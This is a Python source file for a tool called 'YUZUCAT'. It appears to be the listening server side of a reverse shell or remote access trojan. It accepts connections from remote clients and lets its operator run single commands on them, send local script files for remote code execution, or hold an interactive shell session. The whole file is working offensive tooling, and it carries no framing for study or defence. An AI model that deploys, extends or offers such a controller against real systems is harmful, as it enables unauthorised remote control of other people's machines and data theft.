# TCP server
import socket
import banners
import shlex

from colorama import init, Fore
init(autoreset=True)

IP = '' #Put the IP of your machine here
PORT = 9736 # Put your desired port here (Try to make it above 8080)

def send_data(sock, data):
    bytedata = bytes(data, 'utf-8')
    sock.send(bytedata)

def parse_args(client_socket, args):
    args_parsed = shlex.split(args)
    if args_parsed[0] != "yuzucat":
        print(Fore.LIGHTRED_EX + "[YUZUCAT] INCORRECT ARGUMENT")
        return
    if args_parsed[1] == "-h":
        print(Fore.LIGHTCYAN_EX + banners.shell_commands)
        exit()
    if args_parsed[1] == "-c":
        with client_socket as sock:
            send_data(sock, f"execm{args_parsed[2]}")
            data_recv = sock.recv(10000)
            print(f'[YUZUCAT]\n{data_recv.decode("utf-8")}')
    if args_parsed[1] == "-ex":
        with client_socket as sock:
            send_data(client_socket, "exit")
            sock.close()
            print(Fore.LIGHTRED_EX + f'[YUZUCAT] CONNECTION TERMINATED')
            exit()
    if args_parsed[1] == "-eF":
        with client_socket as sock:
            try:
                send_data(sock, f"execs{open(args_parsed[2]).read()}")
                data_recv = sock.recv(10000)
                print(f'[YUZUCAT REMOTE CODE EXECUTION]\n{data_recv.decode("utf-8")}')
            except FileNotFoundError:
                print(Fore.LIGHTRED_EX + "[YUZUCAT] FILE NOT FOUND")
            finally:
                client_socket.close()
                print(Fore.LIGHTRED_EX + f'[YUZUCAT] CONNECTION TERMINATED')
                exit()
    if args_parsed[1] == "-s":
        with client_socket as sock:
            while True:
                shell_cmd = input("SHELL@YUZUCAT> ")
                if shell_cmd == "exit":
                    send_data(sock, f"exit")
                    print(Fore.LIGHTRED_EX + f'[YUZUCAT] CONNECTION TERMINATED')
                    client_socket.close()
                    exit()
                else:
                    send_data(sock, f"execm{shell_cmd}")
                shell_recv = sock.recv(10000)
                print(shell_recv.decode("utf-8"))
            

def main():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT)) # Bind the IP and PORT
    server.listen(5) # Tell the server to start listening with a maximum backlog of connections set to 5
    print(Fore.YELLOW + f'[*] listening on {IP}:{PORT}')
    
    while True:
        client, address = server.accept()
        print(Fore.YELLOW + f'[*] Accepted Connection from {address[0]}:{address[1]}')
        handle_client(client)
#        client_handler = threading.Thread(target=handle_client, args=(client,))
#        client_handler.start()
        
        
def handle_client(client_socket):
    print(Fore.LIGHTGREEN_EX + banners.shell_banner)
    with client_socket as sock:
        request = sock.recv(4096)
        print(Fore.LIGHTCYAN_EX + f'[YUZUCAT] CONNECTION RECIEVED!\n{request.decode("utf-8")}')
        input_args = input("CMD@YUZUCAT> ")
        parse_args(sock, input_args)
        sock.close()
        print(Fore.LIGHTRED_EX + f'[YUZUCAT] CONNECTION TERMINATED')
        
if __name__ == '__main__':
    main()